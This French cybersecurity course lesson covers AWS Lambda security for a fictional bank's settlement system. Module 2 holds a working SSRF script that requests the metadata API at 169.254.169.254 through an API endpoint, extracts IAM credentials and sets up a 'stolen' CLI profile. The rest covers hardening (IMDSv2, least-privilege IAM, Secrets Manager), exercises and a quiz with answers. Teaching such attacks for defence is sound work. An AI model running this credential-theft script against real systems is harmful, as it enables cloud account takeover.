# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 227 (6h) : Sécurité des Architectures Serverless & Functions-as-a-Service (AWS Lambda Security, Event Injection, SSRF via Metadata API, Cold Start Abuse & IAM Least Privilege)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'évaluation de la sécurité des **architectures serverless** et **Functions-as-a-Service (FaaS)** bancaires : compréhension du modèle d'exécution **AWS Lambda** et ses vecteurs d'attaque spécifiques (injection d'événements, **SSRF via l'API de métadonnées EC2 (IMDSv1)**, abus des permissions IAM excessives, extraction de secrets depuis les variables d'environnement Lambda), et mise en œuvre des contre-mesures (IMDSv2, Least Privilege IAM, Lambda Layers sécurisés, Secrets Manager).
>
> **Compétences visées :** `SEC-04` (A) — Serverless Security AWS Lambda Event Injection & SSRF | `SEC-05` (A) — IMDSv2 Hardening, IAM Least Privilege & Secrets Manager

---

## 1) Module — Modèle d'Exécution Serverless & Surface d'Attaque (2h)

### 📖 Narration/Intuition

La BCC a migré plusieurs processus de règlement MNBC vers une architecture **serverless AWS Lambda** : des fonctions Python déclenchées automatiquement par des événements (nouveaux virements sur une file **SQS**, requêtes **API Gateway**, modifications **DynamoDB**).

Le modèle serverless réduit la surface d'attaque **opérationnelle** (plus de serveurs à patcher) mais introduit de nouvelles vulnérabilités **applicatives** souvent méconnues.

### 🔍 Anatomie Technique

**Surface d'Attaque Spécifique aux Fonctions Serverless :**

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                    SURFACE D'ATTAQUE — AWS LAMBDA BCC                        │
├──────────────────────────────────────────────────────────────────────────────┤
│ ENTRÉES (Event Sources = Vecteurs d'Injection)                               │
│  ├── API Gateway → Injection via paramètres HTTP (SQLi, CMDi, SSTI)         │
│  ├── SQS/SNS     → Message Poisoning (payload malveillant dans la file)     │
│  ├── S3 Events   → Filename Injection (clé S3 contenant des commandes)      │
│  └── DynamoDB Streams → Data manipulation events                            │
├──────────────────────────────────────────────────────────────────────────────┤
│ EXÉCUTION (Runtime = Environnement Lambda)                                   │
│  ├── Variables d'environnement → Secrets en clair (anti-pattern critique)   │
│  ├── /tmp filesystem (512 MB) → Écriture de malware ou exfiltration         │
│  ├── SSRF via http://169.254.169.254 → Vol credentials IAM (IMDSv1)         │
│  └── Permissions IAM trop larges → Privilege Escalation Cloud               │
├──────────────────────────────────────────────────────────────────────────────┤
│ DÉPENDANCES (Lambda Layers & Libraries)                                      │
│  ├── Supply Chain Attack → Bibliothèque Python npm/PyPI compromise           │
│  └── Outdated Runtime → CVE dans Python 3.x ou Node.js runtime AWS          │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 2) Module — SSRF via API de Métadonnées EC2 (IMDSv1 → IMDSv2) (2h)

### 📖 Narration/Intuition

L'une des vulnérabilités les plus critiques dans les environnements AWS est le **SSRF (Server-Side Request Forgery) vers l'API de métadonnées EC2** (adresse `http://169.254.169.254/`). Cette API interne expose les **credentials IAM temporaires** de l'instance EC2 ou du rôle d'exécution Lambda. Si une fonction Lambda est vulnérable au SSRF, un attaquant peut voler les credentials IAM et prendre le contrôle du compte AWS.

### 🛠️ Atelier Pratique

**Exploitation SSRF → Vol de Credentials IAM Lambda (`ssrf_lambda_exploit.py`) :**

```python
import requests, json

# SCÉNARIO : La fonction Lambda BCC de traitement des virements MNBC
# accepte une URL fournie par l'utilisateur pour récupérer un document

# URL légitime attendue :
# POST /process-payment {"document_url": "https://docs.bcc.cd/invoice_12345.pdf"}

# ATTAQUE SSRF : Remplacer l'URL par l'adresse de l'API de Métadonnées AWS (IMDSv1)
API_GATEWAY_URL = "https://api.bcc-mnbc.cd/process-payment"

# Step 1 : Récupérer le nom du rôle IAM de la Lambda
ssrf_payload_1 = {
    "document_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
resp_1 = requests.post(API_GATEWAY_URL, json=ssrf_payload_1,
                        headers={"Authorization": "Bearer eyJhbGci..."})
role_name = resp_1.text.strip()
print(f"[SSRF Step 1] Rôle IAM Lambda découvert : {role_name}")
# OUTPUT : bcc-lambda-settlement-role

# Step 2 : Extraire les credentials IAM temporaires du rôle
ssrf_payload_2 = {
    "document_url": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
}
resp_2 = requests.post(API_GATEWAY_URL, json=ssrf_payload_2,
                        headers={"Authorization": "Bearer eyJhbGci..."})
credentials = resp_2.json()
print(f"🚨 [SSRF Step 2] Credentials IAM volés !")
print(f"   AccessKeyId     : {credentials['AccessKeyId']}")
print(f"   SecretAccessKey : {credentials['SecretAccessKey']}")
print(f"   SessionToken    : {credentials['Token'][:50]}...")

# Step 3 : Utiliser les credentials volés pour pivoter dans AWS
import subprocess
subprocess.run([
    "aws", "configure", "--profile", "stolen-bcc-lambda",
    "set", "aws_access_key_id", credentials["AccessKeyId"]
])
# → aws --profile stolen-bcc-lambda s3 ls (Accès à tous les buckets S3 BCC !)
```

---

## 3) Module — Hardening Serverless : IMDSv2, Least Privilege & Secrets Manager (2h)

### 🛠️ Atelier Pratique

**Configuration IAM Least Privilege pour Lambda BCC (`lambda_secure_policy.json`) :**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowLambdaReadSQSOnly",
      "Effect": "Allow",
      "Action": [
        "sqs:ReceiveMessage",
        "sqs:DeleteMessage",
        "sqs:GetQueueAttributes"
      ],
      "Resource": "arn:aws:sqs:af-south-1:123456789:bcc-mnbc-settlements"
    },
    {
      "Sid": "AllowLambdaWriteDynamoDBOnly",
      "Effect": "Allow",
      "Action": [
        "dynamodb:PutItem",
        "dynamodb:UpdateItem"
      ],
      "Resource": "arn:aws:dynamodb:af-south-1:123456789:table/MNBCTransactions"
    },
    {
      "Sid": "AllowReadSecretsOnly",
      "Effect": "Allow",
      "Action": ["secretsmanager:GetSecretValue"],
      "Resource": "arn:aws:secretsmanager:af-south-1:123456789:secret:bcc/mnbc-api-key-*"
    }
  ]
}
```

**Activation IMDSv2 (Protection SSRF Metadata API) & Secrets Manager (`hardening.sh`) :**

```bash
# 1. Forcer IMDSv2 sur toutes les instances EC2 de la BCC (Token requis — bloque SSRF simple)
aws ec2 modify-instance-metadata-options \
    --instance-id i-0123456789abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1 \
    --http-endpoint enabled

echo "✅ IMDSv2 forcé — Requêtes IMDSv1 sans token bloquées"

# 2. Migrer les secrets hors des variables d'environnement Lambda (ANTI-PATTERN)
# MAUVAISE PRATIQUE (Anti-Pattern) :
# aws lambda update-function-configuration --function-name bcc-settlement \
#   --environment "Variables={MNBC_API_KEY=SuperSecretKey123}"

# BONNE PRATIQUE : Stocker dans AWS Secrets Manager
aws secretsmanager create-secret \
    --name "bcc/mnbc-api-key" \
    --secret-string '{"api_key":"SuperSecretKey123"}'

# 3. Code Lambda sécurisé — Récupérer le secret au runtime depuis Secrets Manager
cat << 'LAMBDA_CODE' > bcc_settlement_secure.py
import boto3, json

def get_secret():
    client = boto3.client('secretsmanager', region_name='af-south-1')
    response = client.get_secret_value(SecretId='bcc/mnbc-api-key')
    return json.loads(response['SecretString'])['api_key']

def lambda_handler(event, context):
    api_key = get_secret()  # ✅ Secret récupéré au runtime, jamais en variable d'env
    # Traitement du virement MNBC...
    return {"statusCode": 200, "body": "Virement traité"}
LAMBDA_CODE

echo "✅ Lambda BCC configurée avec Secrets Manager — Variables d'env nettoyées"
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **FaaS** | Functions-as-a-Service — Modèle serverless où le code s'exécute à la demande sans gestion de serveur |
| **IMDS** | Instance Metadata Service — API interne AWS exposant les métadonnées d'une instance EC2/Lambda |
| **IMDSv2** | Instance Metadata Service v2 — Version sécurisée de l'IMDS exigeant un token de session |
| **SQS** | Simple Queue Service — Service de file de messages managé AWS |
| **SSTI** | Server-Side Template Injection — Injection dans les moteurs de templates côté serveur |
| **Supply Chain Attack** | Attaque par la chaîne d'approvisionnement logicielle (bibliothèque compromise) |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Expliquer pourquoi stocker des secrets (clés API, mots de passe de bases de données) dans les **variables d'environnement AWS Lambda** est un anti-pattern de sécurité, et quelle est l'alternative recommandée.

**Corrigé :** Les **variables d'environnement Lambda** constituent un anti-pattern de sécurité pour plusieurs raisons : (1) Elles sont visibles en clair dans la console AWS IAM pour tout utilisateur ayant le droit `lambda:GetFunctionConfiguration` — une permission souvent accordée trop largement. (2) Elles apparaissent en clair dans les logs CloudWatch si une erreur provoque l'affichage des variables de contexte. (3) Elles sont visibles dans le fichier `/proc/self/environ` de l'environnement d'exécution Lambda, accessible si un attaquant parvient à exécuter du code dans la Lambda via une injection. (4) Elles ne bénéficient pas de la rotation automatique de secrets. L'**alternative recommandée** est d'utiliser **AWS Secrets Manager** (ou AWS Systems Manager Parameter Store pour les valeurs moins sensibles) : les secrets sont stockés chiffrés avec KMS, bénéficient de la rotation automatique, et sont récupérés au runtime par le code Lambda via un appel API, sans jamais être exposés dans la configuration de la fonction.

**Exercice 2 :** Expliquer la différence entre **IMDSv1** et **IMDSv2** et pourquoi **IMDSv2** protège contre les attaques SSRF visant l'API de métadonnées EC2.

**Corrigé :** **IMDSv1 (Instance Metadata Service v1)** : L'API de métadonnées est accessible via une simple requête HTTP GET à l'adresse `http://169.254.169.254/latest/meta-data/` sans aucune authentification. N'importe quel processus sur l'hôte (y compris une fonction Lambda exploitée via SSRF) peut accéder directement aux credentials IAM temporaires du rôle d'exécution. **IMDSv2 (Instance Metadata Service v2)** : Introduit un mécanisme de **jetons de session**. Pour accéder à l'API de métadonnées, il faut d'abord effectuer une requête HTTP PUT (avec un en-tête spécial `X-aws-ec2-metadata-token-ttl-seconds`) pour obtenir un token de session, puis inclure ce token dans les requêtes GET suivantes. **Protection contre SSRF** : La plupart des vulnérabilités SSRF exploitent des requêtes HTTP GET uniquement (ex: une Lambda récupérant une URL fournie par l'utilisateur). Un SSRF classique ne peut pas effectuer une requête HTTP PUT préalable pour obtenir le token IMDSv2 — l'accès à l'API de métadonnées est donc bloqué. De plus, le paramètre `--http-put-response-hop-limit 1` empêche la requête de traverser plus d'un saut réseau, bloquant les attaques via des proxies.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle adresse IP interne AWS expose l'**API de métadonnées des instances EC2** (IMDS) et peut être ciblée par un SSRF depuis une fonction Lambda vulnérable pour voler des credentials IAM temporaires ?
- A) http://169.254.169.254/
- B) http://127.0.0.1/
- C) http://10.0.0.1/
- D) http://192.168.0.1/

**Réponse : A**

**Q2 :** Quelle version de l'Instance Metadata Service AWS (**IMDSv2**) protège contre les attaques SSRF en exigeant un jeton de session HTTP PUT préalable avant tout accès aux métadonnées ?
- A) IMDSv2 (Instance Metadata Service version 2)
- B) IMDSv1 (Instance Metadata Service version 1)
- C) AWS VPC Endpoint Metadata v3
- D) AWS IAM Instance Profile v4

**Réponse : A**

**Q3 :** Dans une architecture AWS Lambda, quelle est la **bonne pratique** pour stocker des secrets (clés API, mots de passe) à la place des variables d'environnement Lambda (anti-pattern) ?
- A) Utiliser **AWS Secrets Manager** ou AWS SSM Parameter Store pour stocker les secrets chiffrés, récupérés au runtime par le code Lambda via l'API
- B) Hardcoder les secrets directement dans le code source Lambda
- C) Stocker les secrets dans un fichier `secrets.txt` dans un bucket S3 public
- D) Passer les secrets via les paramètres d'événement Lambda (event body)

**Réponse : A**

**Q4 :** Quel vecteur d'attaque spécifique aux architectures serverless consiste à envoyer un **payload malveillant dans une file de messages SQS** qui sera ensuite traité et exécuté par une fonction Lambda vulnérable ?
- A) Message Poisoning / Event Injection (Injection d'événements via SQS/SNS)
- B) SQL Injection via API Gateway
- C) DDoS par saturation de requêtes API
- D) Lateral Movement via SSH

**Réponse : A**

**Q5 :** Quel principe de sécurité IAM AWS recommande d'accorder à une fonction Lambda **uniquement les permissions strictement nécessaires** à son fonctionnement (ex: `sqs:ReceiveMessage` sur une file spécifique uniquement, et non `sqs:*` sur `*`) ?
- A) Le Principe du Moindre Privilège (Least Privilege Principle)
- B) Le Principe de Défense en Profondeur
- C) Le Principe Zero Trust
- D) Le Principe de Séparation des Tâches (Separation of Duties)

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
